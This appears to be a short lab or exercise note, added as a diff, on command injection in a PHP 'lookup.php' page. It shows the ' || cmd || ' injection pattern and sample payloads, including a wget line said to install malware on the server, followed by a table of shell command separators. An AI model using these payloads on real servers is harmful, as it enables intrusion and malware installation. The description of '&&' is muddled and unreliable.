@@ -1,0 +1,17 @@
+lookup.php
+Injection cmd : ' || Attack cmd you want || '
+can successful exc system("Attack cmd");
+example :
+'||id||' : show the server info
+'||ls||' : show the server directory
+'||wget XXXXXXX||' : can install malware to the server
+
+Command conjunction :
+
+char     description
+;        end of the command
+&        let command run in background
+|        pipe, let the forward output to be the next input of command
+||       OR, if the forward command is failed, execute the next command
+&&       AND,if the forward command is failed, do not execute the next.
+
